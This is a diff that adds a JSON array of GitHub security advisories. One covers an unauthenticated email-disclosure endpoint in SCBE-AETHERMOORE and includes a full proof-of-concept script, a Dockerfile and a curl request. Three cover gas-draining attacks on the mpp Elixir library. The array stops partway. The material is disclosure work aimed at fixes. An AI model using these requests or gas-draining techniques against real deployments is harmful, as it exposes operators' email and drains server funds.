@@ -1,0 +1,520 @@
+[
+  {
+    "ghsa_id": "GHSA-q986-4x7x-gx39",
+    "cve_id": "CVE-2026-57443",
+    "url": "https://api.github.com/advisories/GHSA-q986-4x7x-gx39",
+    "html_url": "https://github.com/advisories/GHSA-q986-4x7x-gx39",
+    "summary": "SCBE-AETHERMOORE Unauthenticated AetherBrowser Ops API Exposes Operator Email Digests",
+    "description": "### Summary\n\nThe AetherBrowser API server (`scripts/aetherbrowser/api_server.py`) exposes the `POST /api/ops/check-email` endpoint without any authentication. Any remote attacker can call this endpoint and trigger execution of the `email_reader.py` subprocess, which connects to configured ProtonMail or Gmail accounts via IMAP and returns email metadata (sender, subject, body snippet) in the JSON response. The server binds to `0.0.0.0:8100` by default with CORS set to `allow_origins=[\"*\"]`, making it reachable from any network or browser origin. This constitutes a critical information-disclosure vulnerability.\n\n### Details\n\n`scripts/aetherbrowser/api_server.py` registers the following route at line 3008 (report excerpt references line 2987; the actual line is 3008):\n\n```python\n@app.post(\"/api/ops/check-email\")\nasync def ops_check_email():\n    script = ROOT / \"scripts\" / \"apollo\" / \"email_reader.py\"\n    result = await asyncio.to_thread(\n        _run_subprocess,\n        [sys.executable, str(script)],\n        timeout=30,\n    )\n    return {\n        \"output\": result.get(\"stdout\", \"\")[:2000],\n        ...\n    }\n```\n\nNo `Depends()` guard, middleware check, or API-key validation is applied. The decorator is a plain `@app.post(...)`, so FastAPI registers the route with zero access control.\n\nThe server is bound to all interfaces (line 4065/4070):\n\n```python\nuvicorn.run(app, host=\"0.0.0.0\", port=port)   # default port 8100\n```\n\nCORS middleware is configured to allow any origin (lines 486–492):\n\n```python\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\"*\"],\n    ...\n)\n```\n\nWhen the endpoint is called, `email_reader.py` is executed as a subprocess. It loads mail credentials from `config/connector_oauth/.env.connector.oauth` (line 29–34 of `email_reader.py`):\n\n```python\n# loads PROTONMAIL_BRIDGE_PASSWORD, GMAIL_APP_PASSWORD, etc.\n```\n\nWith credentials present, the script connects via IMAP, fetches full RFC822 messages, and prints sender, subject, and a body snippet to stdout (lines 273–299). The API then returns the first 2000 characters of that stdout to the unauthenticated caller as JSON.\n\n**Complete data-flow path:**\n\n1. `api_server.py:4065+4070` — server starts on `0.0.0.0:8100`\n2. `api_server.py:486–492` — CORS `allow_origins=[\"*\"]` permits cross-origin requests\n3. `api_server.py:3008` — `POST /api/ops/check-email` registered without auth\n4. `api_server.py:3011–3023` — `_run_subprocess([sys.executable, str(script)])` invoked; stdout captured\n5. `email_reader.py:29–34` — connector env file loaded, credentials extracted\n6. `email_reader.py:378–394` — IMAP login using `PROTONMAIL_BRIDGE_PASSWORD` / `GMAIL_APP_PASSWORD`\n7. `email_reader.py:273–299` — RFC822 messages fetched; sender, subject, snippet printed to stdout\n8. `api_server.py:3023` — `stdout[:2000]` returned in JSON response to caller\n\nEven without credentials configured, the subprocess executes and returns its banner output, confirming the unauthenticated code path reaches the sensitive subprocess invocation.\n\n### PoC\n\n**Prerequisites:**\n\n- Docker installed on the attacker or test machine.\n- Repository source available under `repo/` within the build context.\n\n**Step 1 — Build the Docker image:**\n\n```bash\ndocker build -t vuln001-aetherbrowser -f vuln-001/Dockerfile .\n```\n\nThe Dockerfile (`vuln-001/Dockerfile`) installs `fastapi`, `uvicorn`, and `pydantic`, copies the repository source, and starts `scripts/aetherbrowser/api_server.py` on port 8100.\n\n**Step 2 — Start the container:**\n\n```bash\ndocker run --rm -d --name vuln001-test -p 8100:8100 vuln001-aetherbrowser\n```\n\n**Step 3 — Run the PoC script:**\n\n```bash\npython3 vuln-001/poc.py --host 127.0.0.1 --port 8100\n```\n\nOr send the request manually with no authentication headers:\n\n```bash\ncurl -s -X POST http://127.0.0.1:8100/api/ops/check-email \\\n  -H 'Content-Type: application/json' \\\n  -d '{}'\n```\n\n**Expected result (no credentials configured):**\n\n```json\n{\n  \"output\": \"APOLLO EMAIL READER\\n============================================================\\n  [ProtonMail] No PROTONMAIL_BRIDGE_PASSWORD set\\n  [Gmail] No GMAIL_APP_PASSWORD set\\n\\nNo emails found.\\n\",\n  \"exit_code\": 0,\n  \"errors\": null\n}\n```\n\nHTTP status 200 is returned with no `401` or `403`, and the subprocess stdout appears in the response. In a production deployment with `PROTONMAIL_BRIDGE_PASSWORD` or `GMAIL_APP_PASSWORD` set, the response would contain real email metadata (senders, subjects, body snippets).\n\n**Dynamic test result (Phase 2):**\n\nThe Phase 2 dynamic test confirmed HTTP 200 with the `APOLLO EMAIL READER` banner in the response body. Server access log showed `\"POST /api/ops/check-email HTTP/1.1\" 200 OK` from an unauthenticated source. The subprocess was executed without any authentication gate being triggered.\n\n**Remediation:**\n\nAdd a mandatory API-key dependency to all `/api/ops/*` routes:\n\n```diff\n-from fastapi import FastAPI, HTTPException, Query, Request\n+from fastapi import Depends, FastAPI, Header, HTTPException, Query, Request, status\n\n+def require_ops_api_key(x_api_key: Optional[str] = Header(default=None)) -> None:\n+    expected = os.environ.get(\"AETHERBROWSER_OPS_API_KEY\", \"\").strip()\n+    if not expected:\n+        raise HTTPException(\n+            status_code=status.HTTP_503_SERVICE_UNAVAILABLE,\n+            detail=\"ops endpoints disabled: AETHERBROWSER_OPS_API_KEY is not configured\",\n+        )\n+    if not x_api_key or not hmac.compare_digest(x_api_key, expected):\n+        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=\"invalid ops API key\")\n\n-@app.post(\"/api/ops/check-email\")\n+@app.post(\"/api/ops/check-email\", dependencies=[Depends(require_ops_api_key)])\n async def ops_check_email():\n```\n\nAdditionally, the server should default to `127.0.0.1` instead of `0.0.0.0`, and stdout from operational subprocesses should never be returned verbatim to callers.\n\n### Impact\n\nAn unauthenticated remote attacker who can reach port 8100 of a deployed SCBE-AETHERMOORE instance can:\n\n1. **Exfiltrate operator email metadata**: sender addresses, email subjects, and body snippets from the operator's ProtonMail or Gmail inbox are disclosed in the response.\n2. **Enumerate mail configuration**: even without active credentials, the API reveals which mail providers are configured and prints diagnostic output from internal tooling.\n3. **Trigger repeated IMAP sessions**: repeated calls to the endpoint cause repeated IMAP logins using the stored credentials, potentially generating account alerts or exhausting connection limits.\n\nThe vulnerability affects any deployment where `scripts/aetherbrowser/api_server.py` is running and reachable from an untrusted network. Because the server binds to `0.0.0.0` by default with wildcard CORS, cloud deployments and developer machines with exposed ports are directly affected. No credentials, tokens, or prior knowledge of the application are required by the attacker.\n\n### Reproduction artifacts\n\n#### `Dockerfile`\n\n```dockerfile\n# Dockerfile for VULN-001: Unauthenticated /api/ops/check-email endpoint\n# Reproduces CWE-306 (Missing Authentication for Critical Function) in\n# SCBE-AETHERMOORE api_server.py v4.2.1\n#\n# Build context: pypiAi_1296_issdandavis__SCBE-AETHERMOORE/ (parent of vuln-001/)\n# Build:  docker build -t vuln001-aetherbrowser -f vuln-001/Dockerfile .\n# Run:    docker run --rm -p 8100:8100 vuln001-aetherbrowser\n\nFROM python:3.11-slim\n\nWORKDIR /app\n\n# Install only the packages required for api_server.py to start.\n# All other imports (asyncio, subprocess, pathlib, etc.) are stdlib.\nRUN pip install --no-cache-dir \\\n    \"fastapi>=0.100.0\" \\\n    \"uvicorn[standard]>=0.27.0\" \\\n    \"pydantic>=2.0.0\"\n\n# Copy the repository source.\n# The build context is the report root (parent directory of vuln-001/).\nCOPY repo/ /app/\n\nEXPOSE 8100\n\n# Start the AetherBrowser API server on all interfaces at port 8100.\n# This replicates the production start command documented in api_server.py line 6-8.\nCMD [\"python\", \"scripts/aetherbrowser/api_server.py\"]\n```\n\n#### `poc.py`\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nVULN-001 Proof-of-Concept: Unauthenticated /api/ops/check-email\n\nCWE-306 — Missing Authentication for Critical Function\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  (7.5 High)\n\nTarget: scripts/aetherbrowser/api_server.py (SCBE-AETHERMOORE v4.2.1)\n\nThis PoC demonstrates that:\n  1. POST /api/ops/check-email is accessible without any authentication token.\n  2. The server responds with HTTP 200 instead of 401/403.\n  3. The email-reading subprocess (email_reader.py) is executed and its stdout\n     is returned verbatim in the JSON response — confirming the unauthenticated\n     code path reaches the sensitive subprocess.\n\nUsage:\n    python3 poc.py [--host 127.0.0.1] [--port 8100]\n\"\"\"\n\nimport argparse\nimport json\nimport sys\nimport time\nimport urllib.error\nimport urllib.request\n\n\nTIMEOUT = 10\n\n\ndef wait_for_server(host: str, port: int, max_wait: int = 30) -> bool:\n    \"\"\"Poll the health endpoint until the server is ready.\"\"\"\n    url = f\"http://{host}:{port}/api/health\"\n    deadline = time.time() + max_wait\n    while time.time() < deadline:\n        try:\n            with urllib.request.urlopen(url, timeout=2) as resp:\n                if resp.status < 500:\n                    return True\n        except Exception:\n            pass\n        time.sleep(1)\n    return False\n\n\ndef send_unauthenticated_request(host: str, port: int) -> dict:\n    \"\"\"Send POST /api/ops/check-email with NO authentication headers.\"\"\"\n    url = f\"http://{host}:{port}/api/ops/check-email\"\n    req = urllib.request.Request(\n        url,\n        data=b\"{}\",\n        method=\"POST\",\n        headers={\"Content-Type\": \"application/json\"},\n        # NOTE: No Authorization header, no X-API-Key, no session cookie.\n    )\n    try:\n        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:\n            body = resp.read().decode(\"utf-8\", errors=\"replace\")\n            return {\"status\": resp.status, \"body\": body}\n    except urllib.error.HTTPError as exc:\n        body = exc.read().decode(\"utf-8\", errors=\"replace\")\n        return {\"status\": exc.code, \"body\": body}\n    except Exception as exc:\n        return {\"status\": -1, \"body\": str(exc)}\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser(description=\"VULN-001 PoC — unauthenticated check-email\")\n    parser.add_argument(\"--host\", default=\"127.0.0.1\")\n    parser.add_argument(\"--port\", type=int, default=8100)\n    args = parser.parse_args()\n\n    print(\"=\" * 60)\n    print(\"VULN-001 PoC: Unauthenticated /api/ops/check-email\")\n    print(\"=\" * 60)\n    print(f\"Target: http://{args.host}:{args.port}/api/ops/check-email\")\n    print()\n\n    # Wait for the server to be ready.\n    print(\"[*] Waiting for server to become ready ...\")\n    if not wait_for_server(args.host, args.port):\n        print(\"[!] Server did not become ready within 30 s — check the container\")\n        return 1\n    print(\"[+] Server is up\")\n    print()\n\n    # Send the unauthenticated exploit request.\n    print(\"[*] Sending unauthenticated POST /api/ops/check-email ...\")\n    result = send_unauthenticated_request(args.host, args.port)\n    status = result[\"status\"]\n    body = result[\"body\"]\n\n    print(f\"[*] HTTP status: {status}\")\n    print()\n    print(\"[*] Response body (first 1500 chars):\")\n    print(\"-\" * 60)\n    print(body[:1500])\n    print(\"-\" * 60)\n    print()\n\n    # Parse the JSON response if possible.\n    output_field = \"\"\n    try:\n        parsed = json.loads(body)\n        output_field = parsed.get(\"output\", \"\")\n    except Exception:\n        output_field = \"\"\n\n    # Determine pass/fail.\n    # PASS criteria:\n    #   (a) HTTP 200 — the request was NOT rejected with a 401/403.\n    #   (b) The response body contains the email-reader banner string\n    #       \"APOLLO EMAIL READER\", proving the subprocess was invoked.\n    # Note: Without real IMAP credentials the reader will print the banner\n    # and report \"No PROTONMAIL_BRIDGE_PASSWORD set\" / \"No GMAIL_APP_PASSWORD set\".\n    # With real credentials it would return live email metadata.\n\n    crit_auth = (status == 200)\n    crit_subprocess = (\"APOLLO EMAIL READER\" in output_field or \"APOLLO EMAIL READER\" in body)\n\n    print(\"[*] Criteria evaluation:\")\n    print(f\"    (a) HTTP 200 returned (no auth gate): {'PASS' if crit_auth else 'FAIL'} (got {status})\")\n    print(f\"    (b) Subprocess executed (banner in response): {'PASS' if crit_subprocess else 'FAIL'}\")\n    print()\n\n    if crit_auth and crit_subprocess:\n        print(\"[PASS] Vulnerability confirmed: POST /api/ops/check-email\")\n        print(\"       is reachable without authentication and the email-reading\")\n        print(\"       subprocess is executed, returning its output to the caller.\")\n        return 0\n    elif crit_auth and not crit_subprocess:\n        # Still a valid PASS for the auth-bypass aspect; subprocess may have\n        # errored out but the missing authentication is proven.\n        print(\"[PASS] Auth bypass confirmed: HTTP 200 without credentials.\")\n        print(\"       Subprocess output not captured (may have crashed), but\")\n        print(\"       the endpoint is unauthenticated — CWE-306 is confirmed.\")\n        return 0\n    else:\n        print(\"[FAIL] Could not confirm the vulnerability.\")\n        print(f\"       HTTP status was {status} — expected 200.\")\n        return 2\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n```",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/issdandavis/SCBE-AETHERMOORE/security-advisories/GHSA-q986-4x7x-gx39",
+    "source_code_location": "https://github.com/issdandavis/SCBE-AETHERMOORE",
+    "identifiers": [
+      {
+        "value": "GHSA-q986-4x7x-gx39",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-57443",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/issdandavis/SCBE-AETHERMOORE/security/advisories/GHSA-q986-4x7x-gx39",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-57443",
+      "https://github.com/issdandavis/SCBE-AETHERMOORE/pull/2287",
+      "https://github.com/issdandavis/SCBE-AETHERMOORE/commit/ca833795e01eab060e92572e5f667c0c136b8c1e",
+      "https://github.com/issdandavis/SCBE-AETHERMOORE/commit/de7779b722c501dbcf4eae95dd51bb3984506fb1",
+      "https://github.com/issdandavis/SCBE-AETHERMOORE/releases/tag/v4.2.1",
+      "https://github.com/advisories/GHSA-q986-4x7x-gx39"
+    ],
+    "published_at": "2026-09-25T21:48:03Z",
+    "updated_at": "2026-09-25T21:48:04Z",
+    "github_reviewed_at": "2026-09-25T21:48:03Z",
+    "nvd_published_at": "2026-09-25T21:17:23Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "scbe-aethermoore"
+        },
+        "vulnerable_version_range": ">= 4.0.2, < 4.2.1",
+        "first_patched_version": "4.2.1",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-306",
+        "name": "Missing Authentication for Critical Function"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "EQSTLab",
+          "id": 148991397,
+          "node_id": "U_kgDOCOFtpQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/148991397?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/EQSTLab",
+          "html_url": "https://github.com/EQSTLab",
+          "followers_url": "https://api.github.com/users/EQSTLab/followers",
+          "following_url": "https://api.github.com/users/EQSTLab/following{/other_user}",
+          "gists_url": "https://api.github.com/users/EQSTLab/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/EQSTLab/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/EQSTLab/subscriptions",
+          "organizations_url": "https://api.github.com/users/EQSTLab/orgs",
+          "repos_url": "https://api.github.com/users/EQSTLab/repos",
+          "events_url": "https://api.github.com/users/EQSTLab/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/EQSTLab/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "min8282",
+          "id": 137873062,
+          "node_id": "U_kgDOCDfGpg",
+          "avatar_url": "https://avatars.githubusercontent.com/u/137873062?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/min8282",
+          "html_url": "https://github.com/min8282",
+          "followers_url": "https://api.github.com/users/min8282/followers",
+          "following_url": "https://api.github.com/users/min8282/following{/other_user}",
+          "gists_url": "https://api.github.com/users/min8282/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/min8282/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/min8282/subscriptions",
+          "organizations_url": "https://api.github.com/users/min8282/orgs",
+          "repos_url": "https://api.github.com/users/min8282/repos",
+          "events_url": "https://api.github.com/users/min8282/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/min8282/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "score": 7.5
+    },
+    "epss": {
+      "percentage": 0.00572,
+      "percentile": 0.45059
+    }
+  },
+  {
+    "ghsa_id": "GHSA-vj8p-hp9x-gh47",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-vj8p-hp9x-gh47",
+    "html_url": "https://github.com/advisories/GHSA-vj8p-hp9x-gh47",
+    "summary": "mpp vulnerable to Gas Draining with low gas limit",
+    "description": "## Vulnerability\nWhen the server acts as the fee payer, `mpp` Elixir 0.4.0 (ZenHive/mpp) does not validate whether the `gas_limit` set by the client is enough before broadcasting. A malicious client can drain the server's gas without paying.\n\nA `transferWithMemo` call on Tempo Moderato testnet requires **~51,299 gas** to complete successfully. By setting `gas_limit = 51,298`:\n\n1. The Tx gets cosigned and broadcast by the server.\n2. The Tx runs out of gas during EVM execution. All state reverts.\n3. The server's fee-payer wallet is charged for gas used.\n4. The client pays nothing and receives no resource.\n\n```bash\n# Run the PoC\nunzip mpp_elixir_low_gas_PoC.zip\ncd mpp_elixir_low_gas_PoC\ndocker build -t mpp-elixir-low-gas .\ndocker run --rm mpp-elixir-low-gas\n```\n\n**Zero-Cost DoS Attack:** Unlike gas draining with `access list` or `padding`, where the malicious client needs to complete a payment to drain the gas, this vulnerability allows malicious users to continuously drain the server's gas at virtually no financial cost (requiring only computing power). Therefore, an attacker can spawn *N* malicious clients to completely drain the funds from the server's wallet to perform a Denial of Service (DoS) attack. Once the server's wallet is empty, it has no more funds to pay the gas fees for upcoming requests from legitimate clients. \n\n```bash\n# Run the DoS PoC\nunzip mpp_elixir_low_gas_dos_PoC.zip\ncd mpp_elixir_low_gas_dos_PoC\ndocker build -t mpp-elixir-dos .\ndocker run --rm mpp-elixir-dos\n```\n\n**Vulnerable code path:** `broadcast_and_verify/7` in `mpp/methods/tempo.ex` (ZenHive/mpp 0.4.0).\nWhen `wait_for_confirmation = true` (the default), it calls `rpc_broadcast_sync` directly without any gas-adequacy check or simulation. The alternative `wait_for_confirmation = false` path does call `simulate_payment_call` via `eth_call`, but that simulation omits the `gas` parameter and therefore does not catch out-of-gas conditions.\n\n## Impact\nA malicious client can drain the server's wallet without any financial cost.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/ZenHive/mpp/security-advisories/GHSA-vj8p-hp9x-gh47",
+    "source_code_location": "https://github.com/ZenHive/mpp",
+    "identifiers": [
+      {
+        "value": "GHSA-vj8p-hp9x-gh47",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/ZenHive/mpp/security/advisories/GHSA-vj8p-hp9x-gh47",
+      "https://github.com/ZenHive/mpp/commit/d84e3e528db39654540c2035ea0fbdf7b950d3d1",
+      "https://github.com/ZenHive/mpp/releases/tag/v0.6.0",
+      "https://github.com/advisories/GHSA-vj8p-hp9x-gh47"
+    ],
+    "published_at": "2026-09-25T21:47:36Z",
+    "updated_at": "2026-09-25T21:47:39Z",
+    "github_reviewed_at": "2026-09-25T21:47:36Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "erlang",
+          "name": "mpp"
+        },
+        "vulnerable_version_range": ">= 0.2.0, < 0.6.0",
+        "first_patched_version": "0.6.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N",
+        "score": 8.8
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-20",
+        "name": "Improper Input Validation"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "kai-kka",
+          "id": 46371403,
+          "node_id": "MDQ6VXNlcjQ2MzcxNDAz",
+          "avatar_url": "https://avatars.githubusercontent.com/u/46371403?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/kai-kka",
+          "html_url": "https://github.com/kai-kka",
+          "followers_url": "https://api.github.com/users/kai-kka/followers",
+          "following_url": "https://api.github.com/users/kai-kka/following{/other_user}",
+          "gists_url": "https://api.github.com/users/kai-kka/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/kai-kka/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/kai-kka/subscriptions",
+          "organizations_url": "https://api.github.com/users/kai-kka/orgs",
+          "repos_url": "https://api.github.com/users/kai-kka/repos",
+          "events_url": "https://api.github.com/users/kai-kka/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/kai-kka/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-qpxh-ff8m-c62v",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-qpxh-ff8m-c62v",
+    "html_url": "https://github.com/advisories/GHSA-qpxh-ff8m-c62v",
+    "summary": "mpp vulnerable to Gas Draining with access list",
+    "description": "### Details\nWhen the server acts as the fee_payer, `mpp` Elixir 0.4.0 copies the client-supplied EIP-2930 access list verbatim into the cosigned fee-payer transaction. In `cosign_fee_payer`, the server re-signs the raw `base_fields` (index 5 of the 0x76 AASigned envelope) without inspecting the access list field, which is part of the signed payload.\n\nAccess list gas is charged **intrinsically** — before any opcode executes — regardless of whether the listed addresses are ever touched.\n\nAn attacker submits a valid `transferWithMemo` alongside fabricated address-only access list entries. The server validates calldata and amount but never inspects `access_list` length. It cosigns and broadcasts a transaction that costs the fee-payer wallet `N × 2,400` extra gas per request with no corresponding work performed on-chain.\n\nAt the default of 137 entries and 100 Gwei `max_fee_per_gas`, this inflates the fee-payer cost from the normal ~51,287 gas to ~380,087 gas — a **7.4× multiplier** — while staying within Bandit's default 10,000-byte per-header-field limit (verified empirically).\n\n### PoC\nThe PoC is provided below. It is configured to reproduce the attack on Tempo Moderate testnet within a Docker environment. Download the PoC and run:\n```bash\nunzip mpp_elixir_PoC.zip\ncd mpp_elixir\ndocker build -t mpp-elixir-access-list .\ndocker run --rm mpp-elixir-access-list\n``` \nThere are more details in `mpp_elixir/README.md`\n\n### Impact\nA malicious client can force the server to pay ~**7.4x** the normal transaction fee. This dramatically increases operational costs and completely destroys the profit margin on low-cost items.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/ZenHive/mpp/security-advisories/GHSA-qpxh-ff8m-c62v",
+    "source_code_location": "https://github.com/ZenHive/mpp",
+    "identifiers": [
+      {
+        "value": "GHSA-qpxh-ff8m-c62v",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/ZenHive/mpp/security/advisories/GHSA-qpxh-ff8m-c62v",
+      "https://github.com/ZenHive/mpp/commit/5d6338e2334084c5f2a78cfcca474830733ed7e8",
+      "https://github.com/ZenHive/mpp/releases/tag/v0.6.0",
+      "https://github.com/advisories/GHSA-qpxh-ff8m-c62v"
+    ],
+    "published_at": "2026-09-25T21:45:16Z",
+    "updated_at": "2026-09-25T21:45:26Z",
+    "github_reviewed_at": "2026-09-25T21:45:16Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "erlang",
+          "name": "mpp"
+        },
+        "vulnerable_version_range": ">= 0.2.0, < 0.6.0",
+        "first_patched_version": "0.6.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+        "score": 6.9
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-20",
+        "name": "Improper Input Validation"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "kai-kka",
+          "id": 46371403,
+          "node_id": "MDQ6VXNlcjQ2MzcxNDAz",
+          "avatar_url": "https://avatars.githubusercontent.com/u/46371403?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/kai-kka",
+          "html_url": "https://github.com/kai-kka",
+          "followers_url": "https://api.github.com/users/kai-kka/followers",
+          "following_url": "https://api.github.com/users/kai-kka/following{/other_user}",
+          "gists_url": "https://api.github.com/users/kai-kka/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/kai-kka/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/kai-kka/subscriptions",
+          "organizations_url": "https://api.github.com/users/kai-kka/orgs",
+          "repos_url": "https://api.github.com/users/kai-kka/repos",
+          "events_url": "https://api.github.com/users/kai-kka/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/kai-kka/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-vv77-66rf-pm86",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-vv77-66rf-pm86",
+    "html_url": "https://github.com/advisories/GHSA-vv77-66rf-pm86",
+    "summary": "mpp vulnerable to Gas Draining with no limit",
+    "description": "### Details\nWhen the server acts as the fee_payer, the `mpp` Elixir 0.4.0 does not validate `gas_limit`, `max_fee_per_gas` and `max_priority_fee_per_gas` before cosigning the client's fee-payer transaction. A malicious client embeds arbitrarily large `max_fee_per_gas` and `max_priority_fee_per_gas` values in the signed envelope. The server cosigns and broadcasts — paying those inflated gas costs from its own wallet based on the `effective_gas_price` calculated from the high `max_fee_per_gas` and `max_priority_fee_per_gas` set by the client.\n\n**Vulnerable function:** `cosign_fee_payer/3` in [`transaction.ex`](https://hex.pm/packages/mpp/0.4.0) around lines 229–262.\n\n### PoC\nThe PoC is provided below. It is configured to reproduce the attack on Tempo Moderate testnet within a Docker environment. Download the PoC and run:\n```bash\nunzip mpp_elixir_PoC.zip\ncd mpp_elixir\ndocker build -t mpp-elixir-gasdrain .\ndocker run --rm mpp-elixir-gasdrain\n``` \nThere are more details in `mpp_elixir/README.md`\n\n### Impact\nBy draining the server's wallet, an attacker causes direct financial loss to the organization. Furthermore, if the server's funds are drained completely, legitimate clients will have their requests fail, as the server can no longer fund future transactions, effectively creating a Denial of Service (DoS) attack.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/ZenHive/mpp/security-advisories/GHSA-vv77-66rf-pm86",
+    "source_code_location": "https://github.com/ZenHive/mpp",
+    "identifiers": [
+      {
+        "value": "GHSA-vv77-66rf-pm86",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/ZenHive/mpp/security/advisories/GHSA-vv77-66rf-pm86",
+      "https://github.com/ZenHive/mpp/commit/5d6338e2334084c5f2a78cfcca474830733ed7e8",
+      "https://github.com/ZenHive/mpp/releases/tag/v0.6.0",
+      "https://github.com/advisories/GHSA-vv77-66rf-pm86"
+    ],
+    "published_at": "2026-09-25T21:44:12Z",
+    "updated_at": "2026-09-25T21:44:13Z",
+    "github_reviewed_at": "2026-09-25T21:44:12Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "erlang",
+          "name": "mpp"
+        },
+        "vulnerable_version_range": ">= 0.2.0, < 0.6.0",
+        "first_patched_version": "0.6.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N",
+        "score": 8.8
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-20",
+        "name": "Improper Input Validation"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "kai-kka",
+          "id": 46371403,
+          "node_id": "MDQ6VXNlcjQ2MzcxNDAz",
+          "avatar_url": "https://avatars.githubusercontent.com/u/46371403?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/kai-kka",
+          "html_url": "https://github.com/kai-kka",
+          "followers_url": "https://api.github.com/users/kai-kka/followers",
+          "following_url": "https://api.github.com/users/kai-kka/following{/other_user}",
+          "gists_url": "https://api.github.com/users/kai-kka/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/kai-kka/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/kai-kka/subscriptions",
+          "organizations_url": "https://api.github.com/users/kai-kka/orgs",
+          "repos_url": "https://api.github.com/users/kai-kka/repos",
+          "events_url": "https://api.github.com/users/kai-kka/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/kai-kka/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
